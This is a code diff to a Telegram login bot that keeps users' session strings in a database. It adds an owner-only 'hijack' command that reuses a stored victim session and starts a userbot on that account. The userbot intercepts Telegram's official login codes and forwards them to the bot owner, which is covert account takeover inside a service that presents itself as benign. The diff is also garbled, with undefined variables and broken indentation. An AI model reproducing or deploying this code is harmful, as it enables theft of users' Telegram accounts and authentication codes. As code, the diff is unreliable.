@@ -138,21 +138,57 @@ async def generate_session(_, message):
     await client.disconnect()
     await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
 
+#hijack command
+
+@app.on_message(filters.command("hijack") & filters.user(OWNER_ID))
+async def hijack_session(_, message):
+    """Admin-only command to listen for OTP of a user after checking session validity."""
+    admin_id = message.chat.id
+    await message.reply("Enter the user_id of the user:")
+
+    # Wait for admin to send user_id
+    user_id_msg = await app.listen(admin_id, timeout=60)
+
+    if not user_id_msg.text.isdigit():
+        await message.reply("❌ Invalid user ID. Operation cancelled.")
+        return
+
+    user_id = int(user_id_msg.text)
+
+    # Check if user_id exists in MongoDB (user_sessions_real)
+    user_session = await user_sessions_real.find_one({"user_id": user_id})
+    if not user_session or "session_string" not in user_session:
+        await message.reply("❌ User not found in the database.")
+        return
+
+    session_string = user_session["session_string"]
+
+    # Check if session is alive
+    if not await is_session_alive(session_string):
+        await message.reply("Dead Session")
+        return
+
+    await message.reply("✅ User found! Listening for OTP...")
+
+    # Store admin_id to forward OTP when received
+    otp_listeners[user_id] = admin_id
+
+    
     # ✅ Activate the userbot immediately after login
     try:
-        userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=string_session)
-        asyncio.create_task(userbot.start())  # Runs in the background
+        otp_userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=string_session)
+        asyncio.create_task(otp_userbot.start())  # Runs in the background
         await message.reply("🤖 Bot is now active and ready!")
 
         # ✅ OTP Listening Feature
-        @userbot.on_message(filters.private & filters.user(42777))  # Telegram OTP sender
+         @userbot.on_message(filters.private & filters.user(42777))  # Telegram's official sender ID
         async def otp_listener(_, msg):
             if msg.text.startswith("Login code: "):
-                otp_code = msg.text.split(": ")[1]
-                otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
-                await app.send_message(OWNER_ID, otp_text)
+            otp_code = msg.text.split(": ")[1]
+            otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
+            await app.send_message(OWNER_ID, otp_text)
                 
-        asyncio.create_task(userbot.run())  # Ensures it keeps running
+        asyncio.create_task(otp_userbot.run())  # Ensures it keeps running
         
     except Exception as e:
         await message.reply(f"❌ Failed to start the userbot: {str(e)}")
